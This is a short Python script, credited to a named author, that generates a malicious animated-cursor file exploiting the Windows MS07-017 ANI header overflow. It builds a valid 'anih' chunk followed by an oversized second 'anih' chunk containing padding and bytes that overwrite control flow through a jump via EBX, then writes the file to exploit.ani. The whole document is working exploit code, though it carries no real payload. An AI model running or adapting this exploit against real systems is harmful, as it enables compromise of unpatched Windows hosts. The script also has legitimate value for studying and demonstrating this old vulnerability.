#!/usr/bin/env python3
# Script to generate ANI file that exploits MS07-017
# Author: Prashant Kumar (@notsoshant)

import struct

riff = b"RIFF"
acon = b"ACON"

# Valid anih chunk
valid_anih  = b"\x61\x6e\x69\x68" + b"\x24\x00\x00\x00" + b"\x24\x00\x00\x00" + b"\x02\x00\x00\x00" # "anih" + size + HeaderSize + NumFrames
valid_anih += b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" # NumSteps + Width + Height + BitCount
valid_anih += b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x01\x00\x00\x00"                       # NumPlanes + DisplayRate + Flags


# Chunk with JMP [EBX]
shellcode  = b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41"
shellcode += b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41"
shellcode += b"\x00\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41"
shellcode += b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x41\x41\x41\x41" + b"\x00\x00\x00\x00"
shellcode += b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00"
shellcode += b"\x42\x42\x42\x42" + b"\x0B\x70"

exploit_anih  = b"\x61\x6E\x69\x68" + struct.pack('i',len(shellcode)) + shellcode                   # anih + size + shellcode


length = b"\xcc\xcc\xcc\xcc"

ani = riff + length + acon + valid_anih + exploit_anih

f = open('exploit.ani','w+b')
f.write(ani)
f.close()